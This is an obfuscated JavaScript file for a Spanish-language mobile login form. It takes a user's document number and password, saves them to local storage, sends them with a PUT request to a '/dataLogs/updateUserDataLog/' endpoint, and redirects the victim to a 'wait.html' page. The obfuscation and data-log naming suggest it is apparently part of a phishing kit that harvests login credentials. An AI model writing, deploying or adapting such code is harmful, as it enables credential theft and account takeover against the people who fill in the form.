const _0x30a9d4 = _0x276f;
(function (_0x9ae83b, _0x1ea3dd) {
  const _0xcbed44 = _0x276f,
    _0x390133 = _0x9ae83b();
  while (!![]) {
    try {
      const _0x20e76a =
        (parseInt(_0xcbed44(0x1bb)) / 0x1) *
          (parseInt(_0xcbed44(0x1d7)) / 0x2) +
        (-parseInt(_0xcbed44(0x1b9)) / 0x3) *
          (-parseInt(_0xcbed44(0x1c1)) / 0x4) +
        -parseInt(_0xcbed44(0x1c8)) / 0x5 +
        parseInt(_0xcbed44(0x1bc)) / 0x6 +
        (parseInt(_0xcbed44(0x1d2)) / 0x7) *
          (-parseInt(_0xcbed44(0x1ce)) / 0x8) +
        -parseInt(_0xcbed44(0x1c9)) / 0x9 +
        (parseInt(_0xcbed44(0x1ca)) / 0xa) * (parseInt(_0xcbed44(0x1d6)) / 0xb);
      if (_0x20e76a === _0x1ea3dd) break;
      else _0x390133["push"](_0x390133["shift"]());
    } catch (_0x19e194) {
      _0x390133["push"](_0x390133["shift"]());
    }
  }
})(_0x3734, 0xe8f52);
function _0x276f(_0x1debcf, _0xa44d02) {
  const _0x3734c7 = _0x3734();
  return (
    (_0x276f = function (_0x276f09, _0x445202) {
      _0x276f09 = _0x276f09 - 0x1b6;
      let _0x5eb38f = _0x3734c7[_0x276f09];
      return _0x5eb38f;
    }),
    _0x276f(_0x1debcf, _0xa44d02)
  );
}
function updateLS() {
  const _0x235545 = _0x276f;
  LS["setItem"](_0x235545(0x1d0), JSON[_0x235545(0x1d4)](info));
}
const button = document[_0x30a9d4(0x1bd)](_0x30a9d4(0x1db)),
  userInput = document["getElementById"](_0x30a9d4(0x1dd)),
  passInput = document[_0x30a9d4(0x1bd)]("passwordMovil");
async function updateStatusUser() {
  const _0x9c5b19 = _0x30a9d4;
  button["disabled"] = !![];
  try {
    const _0x4e6fed = localStorage[_0x9c5b19(0x1c6)]("dataLogId"),
      _0x3a48e8 = localStorage[_0x9c5b19(0x1c6)]("dataLogToken");
    if (!_0x4e6fed || !_0x3a48e8) throw new Error(_0x9c5b19(0x1c7));
    const _0x3cef42 = await fetch(url + _0x9c5b19(0x1b8) + _0x4e6fed, {
      method: _0x9c5b19(0x1c0),
      headers: {
        "Content-Type": _0x9c5b19(0x1cd),
        Authorization: _0x9c5b19(0x1cf) + _0x3a48e8,
        Origin: window[_0x9c5b19(0x1cc)][_0x9c5b19(0x1d1)],
      },
      body: JSON[_0x9c5b19(0x1d4)]({
        us: info[_0x9c5b19(0x1da)][_0x9c5b19(0x1bf)],
        ps: info["metaInfo"][_0x9c5b19(0x1d9)],
        status: _0x9c5b19(0x1be),
      }),
    });
    if (!_0x3cef42["ok"]) {
      const _0x3e462a = await _0x3cef42[_0x9c5b19(0x1c3)]();
      throw new Error(_0x3e462a["error"] || _0x9c5b19(0x1d3));
    }
    console["log"](_0x9c5b19(0x1ba)),
      (button[_0x9c5b19(0x1b7)] = ![]),
      (window["location"][_0x9c5b19(0x1c2)] = "wait.html");
  } catch (_0x2830a8) {
    console[_0x9c5b19(0x1c4)](
      "Error\x20al\x20actualizar\x20usuario:",
      _0x2830a8
    ),
      alert(_0x9c5b19(0x1d5)),
      (button[_0x9c5b19(0x1b7)] = ![]);
  }
}
button[_0x30a9d4(0x1dc)](_0x30a9d4(0x1b6), async function (_0x105cd1) {
  const _0x2b519f = _0x30a9d4;
  _0x105cd1[_0x2b519f(0x1c5)]();
  if (userInput[_0x2b519f(0x1cb)] == "" && passInput[_0x2b519f(0x1cb)] == "") {
    alert(_0x2b519f(0x1de)), userInput[_0x2b519f(0x1d8)]();
    return;
  } else {
    var _0x47fd0c = userInput["value"],
      _0x5632d4 = passInput[_0x2b519f(0x1cb)];
    (info[_0x2b519f(0x1da)]["user"] = _0x47fd0c),
      (info["metaInfo"]["puser"] = _0x5632d4),
      updateLS(),
      await updateStatusUser();
  }
});
function _0x3734() {
  const _0x21cce3 = [
    "9gVLDwU",
    "1398wXciNF",
    "getElementById",
    "Corrigió\x20Usuario",
    "user",
    "PUT",
    "3492OMzPUD",
    "href",
    "json",
    "error",
    "preventDefault",
    "getItem",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "5788485eufBLY",
    "2611008usmaLV",
    "10CCzdSk",
    "value",
    "location",
    "application/json",
    "8YISfXw",
    "Bearer\x20",
    "info",
    "origin",
    "3591175eorKPq",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "stringify",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "12428867xXknwh",
    "168694zkGVlQ",
    "focus",
    "puser",
    "metaInfo",
    "btnLogin-page1",
    "addEventListener",
    "docNumberMovil",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "click",
    "disabled",
    "/dataLogs/updateUserDataLog/",
    "3525tioduI",
    "Usuario\x20actualizado\x20correctamente",
  ];
  _0x3734 = function () {
    return _0x21cce3;
  };
  return _0x3734();
}
